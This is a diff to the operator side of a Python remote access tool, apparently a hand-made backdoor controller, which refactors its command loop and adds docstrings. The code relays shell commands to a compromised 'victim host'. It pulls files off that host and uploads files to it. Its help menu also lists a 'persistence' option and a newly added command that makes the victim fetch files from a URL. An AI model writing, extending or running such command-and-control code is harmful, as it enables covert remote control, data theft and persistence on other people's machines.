@@ -9,17 +9,18 @@ def shell():
         cmd = input("* Shell#~%s: " % str(ip))
         if cmd == "exit":
             break
-        elif cmd[:4] == "help":
+        elif cmd.startswith("help"):
             print('Available functions:'
                   '\n- cd {path} => change host directory'
                   '\n- download {file} => Download a file from host'
                   '\n- upload {file} => Upload a file to the host'
-                  '\n- persistence => Try acquiring persistence')
-        elif cmd[:2] == "cd" and len(cmd) > 1:
+                  '\n- persistence => Try acquiring persistence'
+                  '\n- get {url} => Download a remote file')
+        elif cmd.startswith("cd") and len(cmd) > 1:
             reliable_send(cmd)
-        elif cmd[:8] == "download":
+        elif cmd.startswith("download"):
             download(cmd)
-        elif cmd[:6] == "upload":
+        elif cmd.startswith("upload"):
             upload(cmd)
         else:
             reliable_send(cmd)
@@ -54,6 +55,11 @@ def reliable_recv():
 
 
 def download(cmd):
+    """
+    Download a file from victim host
+    :param cmd:
+    :return:
+    """
     try:
         with open(cmd[9:], "wb") as file:
             result = reliable_recv()
@@ -64,6 +70,11 @@ def download(cmd):
 
 
 def upload(cmd):
+    """
+    Upload a file to victim host
+    :param cmd:
+    :return:
+    """
     try:
         with open(cmd[7:], "rb") as file:
             reliable_send(base64.b64encode(file.read()))
